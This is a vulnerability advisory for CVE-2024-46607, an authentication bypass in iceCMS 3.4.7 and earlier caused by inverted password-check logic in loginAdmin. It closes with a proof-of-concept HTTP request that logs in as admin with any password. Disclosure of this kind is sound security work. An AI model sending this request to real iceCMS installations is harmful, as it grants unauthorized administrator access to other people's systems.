**[CVE-ID]**

CVE-2024-46607

**[PRODUCT]**

icecms

**[Vendor of Product]**

https://github.com/Thecosy/iceCMS?tab=readme-ov-file

**[VERSION]**

icecms <=3.4.7

**[Vulnerability Type]**

Incorrect Access Control

**[Description]**
  The bug is in the loginAdmin method in the UserController.java file. The fundamental reason is a code logic error. The verifyPassword method returns true and false. True represents equality, which means the password entered by the user is correct. False represents inequality, which means the password entered by the user is incorrect. In this if statement, when the password is incorrect, the program continues to run directly. However, when the password is correct, an error is reported.

![Alt Text](/icecms/PIC/CVE-2024-46607-1.png)


In the implementation of the verifyPassword method, the encrypted password in the database is directly compared with the plaintext password passed in by the user. So it is definitely wrong and the authentication is bypassed directly for login.

pic-2

## POCï¼š

Use Burpsuite to send the login data packet as follows. Or log in directly on the login page and enter any password.

```
GET /User/loginAdmin?username=admin&password=asdasdas HTTP/1.1
Host: [IP]
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:9528
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:9528/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
pic-3
